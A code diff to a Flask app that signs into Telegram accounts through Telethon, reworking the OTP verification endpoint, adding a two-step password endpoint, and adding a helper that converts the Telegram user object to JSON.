@@ -946,8 +946,156 @@ def login():
 # ==================================
 # 🔑 VERIFY OTP
 # ==================================
+# @app.route("/verify", methods=["POST"])
+# def verify():
+#     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
+#     code = request.form.get("code") or (request.json.get("code") if request.is_json else None)
+#     phone_code_hash = request.form.get("phone_code_hash") or (
+#         request.json.get("phone_code_hash") if request.is_json else None
+#     )
+#
+#     if not all([phone, code, phone_code_hash]):
+#         return jsonify({"status": "error", "detail": "phone/code/phone_code_hash missing"}), 400
+#
+#     async def do_verify():
+#         client = await get_client(phone)
+#         await client.connect()
+#         try:
+#             if await client.is_user_authorized():
+#                 await client.disconnect()
+#                 return {"status": "already_authorized"}
+#
+#             user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+#             await client.send_message("me", "✅ Flask API login successful!")
+#             await save_session(phone, client)
+#             await client.disconnect()
+#             return {"status": "authorized", "user": str(user)}
+#         except PhoneCodeInvalidError:
+#             return {"status": "error", "detail": "Invalid OTP code"}
+#         except SessionPasswordNeededError:
+#             return {"status": "error", "detail": "Two-step verification enabled"}
+#         except Exception as e:
+#             return {"status": "error", "detail": str(e)}
+#
+#     result = asyncio.run(do_verify())
+#     print("✅ Verify result:", result)
+#     return jsonify(result)
+
+
+
+
+
+
+
+
+
+# ==================================
+# 🔑 VERIFY OTP (with Two-Step support)
+# ==================================
+# @app.route("/verify", methods=["POST"])
+# def verify():
+#     """
+#     Telegram OTP ভেরিফিকেশন API
+#     - যদি normal OTP হয় -> সরাসরি authorized হবে
+#     - যদি 2FA password লাগে -> '2fa_required' status ফেরত দেবে
+#     Example:
+#         {
+#           "phone": "+8801606xxxxxx",
+#           "code": "12345",
+#           "phone_code_hash": "xxxxx"
+#         }
+#     """
+#     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
+#     code = request.form.get("code") or (request.json.get("code") if request.is_json else None)
+#     phone_code_hash = request.form.get("phone_code_hash") or (
+#         request.json.get("phone_code_hash") if request.is_json else None
+#     )
+#
+#     if not all([phone, code, phone_code_hash]):
+#         return jsonify({"status": "error", "detail": "phone/code/phone_code_hash missing"}), 400
+#
+#     async def do_verify():
+#         client = await get_client(phone)
+#         await client.connect()
+#         try:
+#             # যদি আগেই লগইন করা থাকে
+#             if await client.is_user_authorized():
+#                 me = await client.get_me()
+#                 await client.disconnect()
+#                 return {
+#                     "status": "already_authorized",
+#                     "user": {"id": me.id, "username": me.username, "first_name": me.first_name},
+#                 }
+#
+#             # OTP verify করার চেষ্টা
+#             user = await client.sign_in(
+#                 phone=phone, code=code, phone_code_hash=phone_code_hash
+#             )
+#
+#             # সফল হলে
+#             await client.send_message("me", "✅ Flask API login successful!")
+#             await save_session(phone, client)
+#             me = await client.get_me()
+#             await client.disconnect()
+#             return {
+#                 "status": "authorized",
+#                 "user": {
+#                     "id": me.id,
+#                     "username": me.username,
+#                     "first_name": me.first_name,
+#                     "phone": me.phone,
+#                 },
+#             }
+#
+#         # ⚠️ যদি 2FA enabled থাকে
+#         except SessionPasswordNeededError:
+#             await client.disconnect()
+#             return {
+#                 "status": "2fa_required",
+#                 "detail": "Two-step verification password needed for this account",
+#             }
+#
+#         # ⚠️ ভুল OTP
+#         except PhoneCodeInvalidError:
+#             await client.disconnect()
+#             return {"status": "error", "detail": "Invalid OTP code"}
+#
+#         # ⚠️ অন্য error
+#         except Exception as e:
+#             await client.disconnect()
+#             return {"status": "error", "detail": str(e)}
+#
+#     # Run async function
+#     result = asyncio.run(do_verify())
+#     print("✅ Verify result:", result)
+#     return jsonify(result)
+
+
+
+
+
+
+
+
+# ==================================
+# 🔑 VERIFY OTP (Full User Info + 2FA Support + Safe JSON)
+# ==================================
 @app.route("/verify", methods=["POST"])
 def verify():
+    """
+    Telegram OTP verification endpoint.
+    Handles:
+    - Normal OTP login
+    - Two-step verification (2FA)
+    - Returns full Telegram user data in JSON
+    Example:
+        POST /verify
+        {
+          "phone": "+8801606xxxxxx",
+          "code": "12345",
+          "phone_code_hash": "xxxxxxxx"
+        }
+    """
     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
     code = request.form.get("code") or (request.json.get("code") if request.is_json else None)
     phone_code_hash = request.form.get("phone_code_hash") or (
@@ -958,6 +1106,70 @@ def verify():
         return jsonify({"status": "error", "detail": "phone/code/phone_code_hash missing"}), 400
 
     async def do_verify():
+        from datetime import datetime
+        client = await get_client(phone)
+        await client.connect()
+        try:
+            # ✅ already authorized
+            if await client.is_user_authorized():
+                me = await client.get_me()
+                await client.disconnect()
+                return {"status": "already_authorized", "user": user_to_dict(me)}
+
+            # ✅ try OTP sign in
+            user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            if not user:
+                await client.disconnect()
+                return {"status": "error", "detail": "sign_in returned None (invalid code or hash)"}
+
+            await client.send_message("me", "✅ Flask API login successful!")
+            await save_session(phone, client)
+
+            me = await client.get_me()
+            await client.disconnect()
+            return {"status": "authorized", "user": user_to_dict(me)}
+
+        except SessionPasswordNeededError:
+            # 🔐 2FA required
+            await client.disconnect()
+            return {
+                "status": "2fa_required",
+                "detail": "Two-step verification password needed for this account"
+            }
+
+        except PhoneCodeInvalidError:
+            await client.disconnect()
+            return {"status": "error", "detail": "Invalid OTP code"}
+
+        except Exception as e:
+            import traceback
+            print("❌ Exception:\n", traceback.format_exc())
+            await client.disconnect()
+            return {"status": "error", "detail": str(e)}
+
+    result = asyncio.run(do_verify())
+    print("✅ Verify result:", result)
+    return jsonify(result)
+
+
+
+
+
+
+
+
+
+# ==================================
+# 🔐 VERIFY 2FA PASSWORD
+# ==================================
+@app.route("/verify_password", methods=["POST"])
+def verify_password():
+    phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
+    password = request.form.get("password") or (request.json.get("password") if request.is_json else None)
+    if not all([phone, password]):
+        return jsonify({"status": "error", "detail": "phone/password missing"}), 400
+
+    async def do_verify_password():
         client = await get_client(phone)
         await client.connect()
         try:
@@ -965,21 +1177,69 @@ def verify():
                 await client.disconnect()
                 return {"status": "already_authorized"}
 
-            user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            await client.send_message("me", "✅ Flask API login successful!")
+            await client.sign_in(password=password)
+            await client.send_message("me", "✅ 2FA password verified successfully!")
             await save_session(phone, client)
             await client.disconnect()
-            return {"status": "authorized", "user": str(user)}
-        except PhoneCodeInvalidError:
-            return {"status": "error", "detail": "Invalid OTP code"}
-        except SessionPasswordNeededError:
-            return {"status": "error", "detail": "Two-step verification enabled"}
+            return {"status": "authorized_by_password"}
         except Exception as e:
+            await client.disconnect()
             return {"status": "error", "detail": str(e)}
 
-    result = asyncio.run(do_verify())
-    print("✅ Verify result:", result)
+    result = asyncio.run(do_verify_password())
+    print("✅ Verify password result:", result)
     return jsonify(result)
+
+
+
+
+
+
+
+
+
+
+
+# ==================================
+# 🧩 Helper: Convert Telegram User → JSON safe
+# ==================================
+def user_to_dict(user):
+    """Convert Telethon User object safely to JSON-serializable dict"""
+    if not user:
+        return {}
+
+    from datetime import datetime
+    data = {}
+    for k, v in vars(user).items():
+        try:
+            if isinstance(v, datetime):
+                data[k] = v.isoformat()
+            elif isinstance(v, (list, tuple, set)):
+                data[k] = [str(x) for x in v]
+            elif isinstance(v, dict):
+                data[k] = {str(key): str(val) for key, val in v.items()}
+            else:
+                data[k] = str(v)
+        except Exception as e:
+            data[k] = f"<unserializable: {e}>"
+    return data
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # ==================================
